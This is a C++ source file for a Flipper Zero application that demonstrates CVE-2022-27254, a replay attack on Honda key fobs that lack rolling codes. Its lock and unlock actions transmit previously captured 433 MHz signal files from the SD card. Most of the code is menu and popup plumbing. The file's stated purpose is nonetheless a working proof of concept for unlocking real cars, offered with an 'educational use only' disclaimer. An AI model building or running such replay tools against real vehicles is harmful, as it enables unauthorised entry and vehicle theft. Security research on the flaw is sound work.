/**
 * Honda Key Fob Replay Application
 *
 * Demonstrates CVE-2022-27254 – Rolling-code-less Honda RF key fob signal
 * replay using a Flipper Zero's CC1101 Sub-GHz transceiver.
 *
 * For educational / research purposes only.
 *
 * Original research: "Security Like The '80s: How I Stole Your RF"
 * Presented at Car Hacking Village, DEFCON 30.
 * Twitter: @ayyappan162010
 *
 * C++ rewrite targeting the Flipper Zero SDK (FuriString API).
 */

#include "honda_keyfob_app.hpp"
#include "views/honda_main_view.hpp"
#include "helpers/honda_subghz.hpp"

#include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/modules/popup.h>
#include <gui/modules/widget.h>
#include <notification/notification_messages.h>
#include <dialogs/dialogs.h>

#define TAG "HondaKeyFob"

// ──────────────────────────────────────────────────────────────────────────────
// Custom-event constants (dispatched from views to the main loop)
// ──────────────────────────────────────────────────────────────────────────────

enum HondaCustomEvent : uint32_t {
    HondaCustomEventLock   = 0,
    HondaCustomEventUnlock = 1,
    HondaCustomEventAbout  = 2,
    HondaCustomEventBack   = 0xFFFFFFFFUL,
};

// ──────────────────────────────────────────────────────────────────────────────
// About text
// ──────────────────────────────────────────────────────────────────────────────

static constexpr const char* ABOUT_TEXT =
    "Honda Key Fob v2.0\n"
    "CVE-2022-27254 PoC\n"
    "Key Fob: KR5V2X\n"
    "433.657 MHz\n"
    "Honda1 preset\n"
    "\n"
    "Educational use only!";

// ──────────────────────────────────────────────────────────────────────────────
// Forward declarations
// ──────────────────────────────────────────────────────────────────────────────

static bool honda_app_custom_event_cb(void* context, uint32_t event);
static bool honda_app_back_event_cb(void* context);

// ──────────────────────────────────────────────────────────────────────────────
// Allocation / deallocation helpers
// ──────────────────────────────────────────────────────────────────────────────

static HondaKeyFobApp* honda_app_alloc() {
    auto* app = new HondaKeyFobApp{};

    // Records
    app->gui           = static_cast<Gui*>(furi_record_open(RECORD_GUI));
    app->notifications = static_cast<NotificationApp*>(furi_record_open(RECORD_NOTIFICATION));
    app->dialogs       = static_cast<DialogsApp*>(furi_record_open(RECORD_DIALOGS));

    // ViewDispatcher
    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_enable_queue(app->view_dispatcher);
    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);
    view_dispatcher_set_custom_event_callback(app->view_dispatcher, honda_app_custom_event_cb);
    view_dispatcher_set_navigation_event_callback(app->view_dispatcher, honda_app_back_event_cb);

    // Popup (used for "Transmitting…" / result feedback)
    app->popup = popup_alloc();
    view_dispatcher_add_view(app->view_dispatcher, HondaViewPopup, popup_get_view(app->popup));

    // Widget (used for the About screen)
    app->widget = widget_alloc();
    view_dispatcher_add_view(app->view_dispatcher, HondaViewWidget, widget_get_view(app->widget));

    // SubGHz
    honda_subghz_init(app);

    app->pending_action = HondaAction::None;

    return app;
}

static void honda_app_free(HondaKeyFobApp* app) {
    furi_assert(app);

    honda_subghz_deinit(app);

    view_dispatcher_remove_view(app->view_dispatcher, HondaViewPopup);
    popup_free(app->popup);

    view_dispatcher_remove_view(app->view_dispatcher, HondaViewWidget);
    widget_free(app->widget);

    view_dispatcher_free(app->view_dispatcher);

    furi_record_close(RECORD_DIALOGS);
    furi_record_close(RECORD_NOTIFICATION);
    furi_record_close(RECORD_GUI);

    delete app;
}

// ──────────────────────────────────────────────────────────────────────────────
// Transmit helpers
// ──────────────────────────────────────────────────────────────────────────────

static void honda_app_do_transmit(HondaKeyFobApp* app, HondaAction action) {
    furi_assert(app);

    const char* sub_path = (action == HondaAction::Lock) ? HONDA_LOCK_SUB_PATH
                                                          : HONDA_UNLOCK_SUB_PATH;
    const char* action_label = (action == HondaAction::Lock) ? "Locking…" : "Unlocking…";
    const char* result_label_ok  = (action == HondaAction::Lock) ? "Lock sent!" : "Unlock sent!";
    const char* result_label_err = "TX Failed!\nCheck SD card.";

    // Show "Transmitting" popup
    popup_set_header(app->popup, "Honda Key Fob", 64, 2, AlignCenter, AlignTop);
    popup_set_text(app->popup, action_label, 64, 32, AlignCenter, AlignCenter);
    popup_set_timeout(app->popup, 0);
    view_dispatcher_switch_to_view(app->view_dispatcher, HondaViewPopup);

    notification_message(app->notifications, &sequence_blink_start_magenta);

    bool ok = honda_subghz_transmit_file(app, sub_path);

    notification_message(app->notifications, &sequence_blink_stop);

    // Show result popup (auto-dismiss after 1.5 s)
    popup_set_header(app->popup, "Honda Key Fob", 64, 2, AlignCenter, AlignTop);
    popup_set_text(
        app->popup, ok ? result_label_ok : result_label_err, 64, 32, AlignCenter, AlignCenter);
    popup_set_timeout(app->popup, 1500);
    popup_set_callback(app->popup, [](void* ctx) {
        auto* a = static_cast<HondaKeyFobApp*>(ctx);
        view_dispatcher_send_custom_event(a->view_dispatcher, HondaCustomEventBack);
    });
    popup_set_context(app->popup, app);
}

// ──────────────────────────────────────────────────────────────────────────────
// About screen helper
// ──────────────────────────────────────────────────────────────────────────────

static void honda_app_show_about(HondaKeyFobApp* app) {
    widget_reset(app->widget);
    widget_add_text_scroll_element(app->widget, 0, 0, 128, 64, ABOUT_TEXT);
    view_dispatcher_switch_to_view(app->view_dispatcher, HondaViewWidget);
}

// ──────────────────────────────────────────────────────────────────────────────
// Event callbacks
// ──────────────────────────────────────────────────────────────────────────────

static bool honda_app_custom_event_cb(void* context, uint32_t event) {
    furi_assert(context);
    auto* app = static_cast<HondaKeyFobApp*>(context);

    switch(static_cast<HondaCustomEvent>(event)) {
    case HondaCustomEventLock:
        honda_app_do_transmit(app, HondaAction::Lock);
        return true;

    case HondaCustomEventUnlock:
        honda_app_do_transmit(app, HondaAction::Unlock);
        return true;

    case HondaCustomEventAbout:
        honda_app_show_about(app);
        return true;

    case HondaCustomEventBack:
        // Return to the main menu view (registered before run)
        view_dispatcher_switch_to_view(app->view_dispatcher, HondaViewMenu);
        return true;

    default:
        return false;
    }
}

static bool honda_app_back_event_cb(void* context) {
    furi_assert(context);
    auto* app = static_cast<HondaKeyFobApp*>(context);
    view_dispatcher_stop(app->view_dispatcher);
    return true;
}

// ──────────────────────────────────────────────────────────────────────────────
// Entry point
// ──────────────────────────────────────────────────────────────────────────────

extern "C" int32_t honda_keyfob_app(void* /*p*/) {
    // Check that transmission is allowed in this region
    if(!furi_hal_region_is_provisioned()) {
        // Allocate minimal resources just to show the error dialog
        DialogsApp* dialogs = static_cast<DialogsApp*>(furi_record_open(RECORD_DIALOGS));

        DialogMessage* msg = dialog_message_alloc();
        dialog_message_set_header(msg, "Firmware Update Needed", 63, 3, AlignCenter, AlignTop);
        dialog_message_set_text(
            msg,
            "Please update firmware\nbefore using Sub-GHz.\nflipp.dev/upd",
            0,
            17,
            AlignLeft,
            AlignTop);
        dialog_message_show(dialogs, msg);
        dialog_message_free(msg);

        furi_record_close(RECORD_DIALOGS);
        return 1;
    }

    HondaKeyFobApp* app = honda_app_alloc();

    // Build the main menu view and attach it to the dispatcher
    HondaMainView* main_view = honda_main_view_alloc();
    view_dispatcher_add_view(
        app->view_dispatcher, HondaViewMenu, honda_main_view_get_view(main_view));

    // Attach dispatcher to the full-screen GUI
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);
    view_dispatcher_switch_to_view(app->view_dispatcher, HondaViewMenu);

    // Suppress charge while Sub-GHz hardware may be active
    furi_hal_power_suppress_charge_enter();

    view_dispatcher_run(app->view_dispatcher);

    furi_hal_power_suppress_charge_exit();

    // Cleanup
    view_dispatcher_remove_view(app->view_dispatcher, HondaViewMenu);
    honda_main_view_free(main_view);

    honda_app_free(app);

    return 0;
}
